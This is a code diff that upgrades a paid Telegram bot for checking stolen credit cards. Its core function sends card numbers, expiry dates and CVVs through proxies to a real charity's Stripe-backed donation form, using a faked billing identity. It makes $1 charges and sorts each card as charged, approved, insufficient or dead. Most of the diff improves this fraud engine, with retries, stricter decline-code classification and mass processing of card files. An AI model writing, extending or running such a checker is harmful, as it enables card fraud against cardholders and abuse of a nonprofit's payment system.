@@ -1,6 +1,6 @@
 # ==============================================================================
 # 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 & 𝐒𝐓𝐑𝐈𝐏𝐄 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
-# (CUSTOM ANIMATED EMOJI IDs, GLOBAL CHARGED FONT, STRICT STRIPE CLASSIFICATION)
+# (CUSTOM ANIMATED EMOJI IDs, GLOBAL CHARGED FONT, STRICT STRIPE ENGINE, FORCED GIFS)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -83,7 +83,7 @@ USER_LAST_REQ = {}
 ACTIVE_MTXT_PROCESSES = {}
 PENDING_FILES = {}
 
-# ====================== GLOBAL CHARGED FONT ENGINE ======================
+# ====================== GLOBAL CHARGED FONT ENGINE & REVERSE TRANSLATOR ======================
 def sf(text) -> str:
     """Converts ALL English letters and Numbers to Mathematical Sans-Serif Bold (𝗖𝗛𝗔𝗥𝗚𝗘𝗗 style)"""
     if text is None: return ""
@@ -92,6 +92,18 @@ def sf(text) -> str:
         if 'A' <= c <= 'Z': res += chr(ord(c) - 65 + 0x1D5D4)
         elif 'a' <= c <= 'z': res += chr(ord(c) - 97 + 0x1D5EE)
         elif '0' <= c <= '9': res += chr(ord(c) - 48 + 0x1D7CE)
+        else: res += c
+    return res
+
+def unsf(text) -> str:
+    """Reverts Mathematical Sans-Serif Bold back to standard ASCII for exact database matching"""
+    if text is None: return ""
+    res = ""
+    for c in str(text):
+        o = ord(c)
+        if 0x1D5D4 <= o <= 0x1D5ED: res += chr(o - 0x1D5D4 + 65)
+        elif 0x1D5EE <= o <= 0x1D607: res += chr(o - 0x1D5EE + 97)
+        elif 0x1D7CE <= o <= 0x1D7D7: res += chr(o - 0x1D7CE + 48)
         else: res += c
     return res
 
@@ -187,7 +199,7 @@ def get_cc_limit(plan, uid=0):
 def is_paid_plan(plan):
     return plan and plan.lower() in [p.lower() for p in PAID_TIERS]
 
-# ====================== ZERO-DELAY GIF ENGINE ======================
+# ====================== STRICT FORCED GIF ENGINE ======================
 async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
     markup = InlineKeyboardMarkup(buttons) if buttons else None
     target = update.callback_query.message if update.callback_query else update.message
@@ -197,21 +209,24 @@ async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, sp
         url = specific_gif or random.choice(ANIME_GIFS)
         media_to_send = _GIF_FILE_IDS.get(url, url)
         
-        try: 
-            msg = await target.reply_animation(
-                animation=media_to_send, 
-                caption=text, 
-                reply_markup=markup, 
-                parse_mode=ParseMode.HTML,
-                read_timeout=15,
-                write_timeout=15,
-                connect_timeout=15
-            )
-            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                _GIF_FILE_IDS[url] = msg.animation.file_id
-            return msg
-        except Exception:
-            pass 
+        for _ in range(3):
+            try: 
+                msg = await target.reply_animation(
+                    animation=media_to_send, 
+                    caption=text, 
+                    reply_markup=markup, 
+                    parse_mode=ParseMode.HTML,
+                    read_timeout=30,
+                    write_timeout=30,
+                    connect_timeout=30
+                )
+                if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+                    _GIF_FILE_IDS[url] = msg.animation.file_id
+                return msg
+            except RetryAfter as e:
+                await asyncio.sleep(e.retry_after + 1)
+            except Exception:
+                await asyncio.sleep(1)
 
     try: 
         return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -232,22 +247,26 @@ async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_g
     if use_gif or specific_gif:
         url = specific_gif or random.choice(ANIME_GIFS)
         media_to_send = _GIF_FILE_IDS.get(url, url)
-        try: 
-            msg = await bot.send_animation(
-                chat_id=chat_id, 
-                animation=media_to_send, 
-                caption=text, 
-                reply_markup=markup, 
-                parse_mode=ParseMode.HTML,
-                read_timeout=15,
-                write_timeout=15,
-                connect_timeout=15
-            )
-            if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
-                _GIF_FILE_IDS[url] = msg.animation.file_id
-            return msg
-        except Exception:
-            pass
+        
+        for _ in range(3):
+            try: 
+                msg = await bot.send_animation(
+                    chat_id=chat_id, 
+                    animation=media_to_send, 
+                    caption=text, 
+                    reply_markup=markup, 
+                    parse_mode=ParseMode.HTML,
+                    read_timeout=30,
+                    write_timeout=30,
+                    connect_timeout=30
+                )
+                if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
+                    _GIF_FILE_IDS[url] = msg.animation.file_id
+                return msg
+            except RetryAfter as e:
+                await asyncio.sleep(e.retry_after + 1)
+            except Exception:
+                await asyncio.sleep(1)
 
     try: 
         return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -388,7 +407,7 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await styled_reply(update, f"<b>{CE_FIRE} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
 
-# ====================== CHECKER CORE API (SHOPIFY + STRIPE 1$) ======================
+# ====================== STRICT CHECKER API (SHOPIFY + STRIPE 1$) ======================
 async def get_bin_info(bin_code):
     try:
         async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
@@ -400,10 +419,10 @@ async def get_bin_info(bin_code):
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
 async def check_stripe_donate_api(card, proxy, session):
-    """Fully Async Engine translated natively for Stripe 1$ Gateway with Strict Classification"""
+    """STRICT Stripe Donate 1$ Gateway - Zero False Positives"""
     try:
         parts = card.split('|')
-        if len(parts) < 4: return {'status': 'Dead', 'message': 'Invalid Card', 'card': card}
+        if len(parts) < 4: return {'status': 'Dead', 'message': 'Invalid Card Format', 'card': card}
         cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
         yy_short = yy if len(yy) == 2 else yy[-2:]
         email = f'Ahmed{random.randint(100,999)}@gmail.com'
@@ -415,7 +434,7 @@ async def check_stripe_donate_api(card, proxy, session):
         base_url = 'https://printsofhope.org'
         ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
         
-        # 1. Init
+        # 1. Fetch Form Tokens
         headers_get = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
         async with session.get(site_url, headers=headers_get, proxy=proxy_str, timeout=30) as r1:
             html = await r1.text()
@@ -440,7 +459,7 @@ async def check_stripe_donate_api(card, proxy, session):
         sa_v = sa.group(1) if sa else ''
         sa_param = f'&_stripe_account={sa_v}' if sa_v else ''
 
-        # 2. Ajax
+        # 2. Ajax Initialization
         headers_ajax = {'origin': base_url, 'referer': site_url, 'user-agent': ua, 'x-requested-with': 'XMLHttpRequest'}
         data_ajax = {
             'give-honeypot': '', 'give-form-id-prefix': fp_v, 'give-form-id': fi_v,
@@ -458,7 +477,7 @@ async def check_stripe_donate_api(card, proxy, session):
         async with session.post(f'{base_url}/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax, proxy=proxy_str, timeout=30) as r3:
             await r3.text()
 
-        # 3. Stripe 
+        # 3. Stripe Tokenization (Early Catch)
         headers_stripe = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua}
         stripe_data = f'type=card&billing_details[name]=Ahmed++Ahmed+&billing_details[email]={email}&billing_details[address][line1]=Ahmed+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d&muid=3b562720-d431-4fa4-b092-278d4639a6f3&sid=70a0ddd2-988f-425f-9996-372422a311c4&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer={site_url}&time_on_page=85758&key={pk_v}{sa_param}'
 
@@ -467,25 +486,23 @@ async def check_stripe_donate_api(card, proxy, session):
 
         if 'error' in sr:
             em = sr['error'].get('message', 'Unknown Error')
-            ec = sr['error'].get('code', 'unknown')
+            ec = sr['error'].get('code', '')
             ed = sr['error'].get('decline_code', '')
             err_msg = f"{em} ({ed})" if ed else em
             
             rl = err_msg.lower()
-            if 'insufficient' in rl or 'not enough' in rl or ed == 'insufficient_funds':
+            if 'insufficient' in rl or 'not enough' in rl or ed == 'insufficient_funds': 
                 return {'status': 'Insufficient', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif 'security code is incorrect' in rl or 'card number is incorrect' in rl or ed in ['incorrect_cvc', 'invalid_cvc', 'incorrect_number', 'invalid_number']:
+            elif 'security code is incorrect' in rl or 'card number is incorrect' in rl or ec in ['incorrect_cvc', 'incorrect_zip'] or ed in ['incorrect_cvc', 'incorrect_zip']: 
                 return {'status': 'Approved', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif ed in ['transaction_not_allowed', 'do_not_honor', 'generic_decline', 'fraudulent', 'lost_card', 'stolen_card', 'pickup_card', 'restricted_card', 'invalid_account']:
-                return {'status': 'Dead', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif 'rate_limit' in rl or 'processing error' in rl or ec == 'rate_limit' or ed == 'processing_error':
+            elif 'rate_limit' in rl or 'processing error' in rl or ec == 'rate_limit': 
                 return {'status': 'Site Error', 'message': err_msg, 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            else:
+            else: 
                 return {'status': 'Dead', 'message': err_msg, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
         pm_id = sr['id']
 
-        # 4. Final Processing & Strict Classification
+        # 4. Strict Final Processing (The Core Fix)
         headers_final = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': base_url, 'referer': site_url, 'upgrade-insecure-requests': '1', 'user-agent': ua}
         params_final = {'payment-mode': 'stripe', 'form-id': fi_v}
         data_final = data_ajax.copy()
@@ -496,44 +513,45 @@ async def check_stripe_donate_api(card, proxy, session):
             final_text = await r5.text()
             current_url = str(r5.url).lower()
 
-        # Step A: Check Explicit Errors
-        error_match = re.search(r'(class="give_error"|class="give_notices give_errors">)(.*?)(</li>|</div>)', final_text, re.IGNORECASE | re.DOTALL)
-        if error_match:
-            clean_error = re.sub(r'<[^>]+>', '', error_match.group(2))
-            clean_error = unescape(clean_error).strip()
-            clean_error = re.sub(r'\s+', ' ', clean_error).replace('Error:', '').strip()
-            rl = clean_error.lower()
-            
-            if 'insufficient funds' in rl or 'not enough' in rl:
-                return {'status': 'Insufficient', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif 'security code is incorrect' in rl or 'card number is incorrect' in rl or 'zip' in rl or 'cvc' in rl or 'approved' in rl:
-                return {'status': 'Approved', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-            elif any(k in rl for k in ['minimum donation', 'robot', 'captcha', 'processing error']):
-                return {'status': 'Site Error', 'message': clean_error, 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+        # Rule A: Explicit WordPress/GiveWP Errors (Highest Priority)
+        if 'give_error' in final_text.lower() or 'give_errors' in final_text.lower():
+            err_matches = re.findall(r'<li[^>]*>(.*?)</li>', final_text, re.IGNORECASE)
+            if not err_matches:
+                err_matches = re.findall(r'class="give_error[^>]*>(.*?)</div>', final_text, re.IGNORECASE)
+                
+            if err_matches:
+                clean_error = " | ".join([unescape(re.sub(r'<[^>]+>', '', em)).strip() for em in err_matches])
             else:
+                clean_error = "Card Declined"
+                
+            rl = clean_error.lower()
+            if 'insufficient funds' in rl or 'not enough' in rl: 
+                return {'status': 'Insufficient', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            elif 'security code is incorrect' in rl or 'card number is incorrect' in rl or 'zip' in rl or 'cvc' in rl or 'approved' in rl: 
+                return {'status': 'Approved', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            elif any(k in rl for k in ['minimum donation', 'robot', 'captcha', 'security check', 'processing error']): 
+                return {'status': 'Site Error', 'message': clean_error, 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            else: 
                 return {'status': 'Dead', 'message': clean_error, 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
-        # Step B: Strict Declines
-        if 'Your card was declined' in final_text:
-            return {'status': 'Dead', 'message': 'Your card was declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-        if 'payment_failed' in final_text:
-            return {'status': 'Dead', 'message': 'Payment Failed', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+        # Rule B: Generic Dead Phrases
+        if 'declined' in final_text.lower() or 'payment failed' in final_text.lower():
+            return {'status': 'Dead', 'message': 'Payment Failed / Declined', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
-        # Step C: Strict Success Validation
-        if 'donation-confirmation' in current_url or 'receipt' in current_url or 'success' in current_url:
-            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
-        
-        success_phrases = ['Thank you for your donation', 'Donation Receipt', 'Payment Complete', 'Payment Succeeded']
+        # Rule C: Strict Charged Logic (Must have explicit receipt/confirmation flag)
+        if 'donation-receipt' in final_text.lower() or 'donation-confirmation' in final_text.lower() or 'donation-confirmation' in current_url or 'receipt' in current_url:
+            return {'status': 'Charged', 'message': 'Donation Successful', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+            
+        success_phrases = ['thank you for your donation', 'donation receipt', 'payment complete', 'payment succeeded']
         for phrase in success_phrases:
-            if phrase.lower() in final_text.lower() and 'give_error' not in final_text.lower():
+            if phrase.lower() in final_text.lower():
                 return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
-        # Step D: Unknown (Safe Fallback to Dead)
-        return {'status': 'Dead', 'message': 'Card Declined / Unknown', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
+        # Rule D: Ultimate Fallback (If not explicitly charged, it is DEAD. Never assume charged.)
+        return {'status': 'Dead', 'message': 'Gateway Declined (No Confirmation)', 'card': card, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
     except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-    except Exception as e: return {'status': 'Site Error', 'message': f'Connection Error', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
-
+    except Exception as e: return {'status': 'Site Error', 'message': f'Connection Error: {str(e)[:20]}', 'card': card, 'retry': True, 'gateway': 'Stripe (1$)', 'price': '1$'}
 
 async def check_card_api(card, site, proxy, session, gateway_name):
     try:
@@ -688,7 +706,6 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         if len(cards) > cl: cards = cards[:cl]
         PENDING_FILES[uid] = cards
         
-        # Grid Button Integration for Stripe 1$
         kb = [
             [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success"), InlineKeyboardButton(sf("Stripe (1$)"), callback_data="gate:Stripe", style="success")],
             [InlineKeyboardButton(sf("Braintree (Soon)"), callback_data="gate:soon_Braintree", style="primary"), InlineKeyboardButton(sf("PayPal (Soon)"), callback_data="gate:soon_PayPal", style="primary")],
@@ -845,7 +862,8 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "redeem":
         if not await force_join_check(update, context): return
-        c = args[0].strip() if args else ""
+        raw_c = args[0].strip() if args else ""
+        c = unsf(raw_c)
         if not c: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Please provide your key:')}</b> <code>/redeem [Key]</code>", use_gif=True)
         kdb = await load_keys()
         if c not in kdb: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Invalid Key. Please check and try again.')}</b>", use_gif=True)
@@ -881,7 +899,8 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "validate":
         if uid not in ADMIN_ID: return
-        c = args[0].strip() if args else ""
+        raw_c = args[0].strip() if args else ""
+        c = unsf(raw_c)
         kdb = await load_keys()
         if not c: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Syntax')}:</b> <code>/validate [Key]</code>", use_gif=True)
         if c not in kdb: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Key not found in database.')}</b>", use_gif=True)
@@ -931,7 +950,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif cmd == "revoke":
         if uid not in ADMIN_ID: return
         if not args: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Please provide a valid ID.')}</b>", use_gif=True)
-        try: tu = int(args[0].strip())
+        try: tu = int(unsf(args[0].strip()))
         except Exception: return await styled_reply(update, f"<b>{CE_FIRE} {sf('Please provide a valid ID.')}</b>", use_gif=True)
         await set_user_plan(tu, "Free", 0)
         proc = ACTIVE_MTXT_PROCESSES.get(tu)
@@ -1093,7 +1112,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             try:
                 c_st = time.time()
                 
-                # Dynamic Routing based on selected Gateway
                 if gate_name == "Stripe":
                     p = random.choice(proxies) if proxies else None
                     res = await check_stripe_donate_api(card, p, http_session)
@@ -1200,7 +1218,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
     
-    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH ASYNC STRIPE 1$ & CHARGED FONT!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH STRICT STRIPE 1$ & CHARGED FONT!")
     
     while True:
         try:
